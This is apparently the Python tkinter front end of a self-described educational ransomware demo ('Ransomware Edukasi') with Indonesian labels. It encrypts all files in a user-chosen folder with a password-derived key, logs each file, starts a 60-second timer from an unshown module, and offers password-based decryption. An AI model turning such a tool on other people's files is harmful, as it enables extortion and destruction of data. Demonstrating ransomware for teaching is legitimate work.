import tkinter as tk
from tkinter import filedialog
from encryptor import *
from timer import start_timer
import hashlib

key = None
status_log = []

def update_status(msg):
    status_log.append(msg)
    log_text.config(state='normal')
    log_text.insert(tk.END, msg + '\n')
    log_text.config(state='disabled')
    with open("log.txt", "a") as log:
        log.write(msg + '\n')

def select_folder():
    path = filedialog.askdirectory()
    folder_var.set(path)

def encrypt_action():
    global key
    password = password_entry.get()
    if not password or not folder_var.get():
        return update_status("⚠️ Password dan folder wajib diisi!")
    key = generate_key(password)
    for file_path in get_all_files(folder_var.get()):
        if encrypt_file(file_path, key):
            update_status(f"🔐 Enkripsi: {file_path}")
    start_timer(60, folder_var.get(), update_status)

def decrypt_action():
    global key
    password = password_entry.get()
    if not password:
        return update_status("⚠️ Password diperlukan untuk dekripsi!")
    key = generate_key(password)
    for file_path in get_all_files(folder_var.get()):
        if decrypt_file(file_path, key):
            update_status(f"🔓 Dekripsi: {file_path}")

root = tk.Tk()
root.title("Ransomware Edukasi")
root.geometry("540x500")
root.configure(bg="#1e1e1e")

tk.Label(root, text="📂 Pilih Folder Target:", fg="white", bg="#1e1e1e").pack(pady=5)
folder_var = tk.StringVar()
tk.Entry(root, textvariable=folder_var, width=50).pack()
tk.Button(root, text="Browse", command=select_folder).pack(pady=5)

tk.Label(root, text="🔑 Masukkan Password:", fg="white", bg="#1e1e1e").pack(pady=5)
password_entry = tk.Entry(root, show="*", width=50)
password_entry.pack()

tk.Button(root, text="🔐 Enkripsi", command=encrypt_action, bg="red", fg="white").pack(pady=10)
tk.Button(root, text="🔓 Dekripsi", command=decrypt_action, bg="green", fg="white").pack(pady=5)

tk.Label(root, text="📄 Status:", fg="white", bg="#1e1e1e").pack()
log_text = tk.Text(root, height=10, width=65, state='disabled', bg="black", fg="lime")
log_text.pack(pady=5)

root.mainloop()
